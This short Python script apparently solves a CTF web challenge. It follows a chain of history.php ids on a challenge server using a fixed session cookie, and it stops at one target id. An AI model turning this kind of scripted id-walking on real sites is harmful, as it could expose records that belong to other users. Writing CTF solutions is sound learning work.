#!/usr/bin/env python3

import requests

prefix = "http://ctf.adl.tw:12007/history.php?id="
my_id = "140c6c436a64f7e6705605a357d5cb14b12bb411"
url = prefix + my_id
cookies = {"PHPSESSID" : "5f9160dc6b87dde4c8623d5128cb4a44"}
count = 1

r = requests.get(url, cookies = cookies, allow_redirects = False)

while(len(r.text) == 2173):
    my_id = r.text[2104:2144]
    if my_id == "1e3176e5e550f7d6eab27edd45fcfa73000d7c73":
        print(r.text)
        print(r.headers)
        input("stop!")
    url = prefix + my_id
    r = requests.get(url, cookies = cookies, allow_redirects = False)
    count += 1
    print(count)
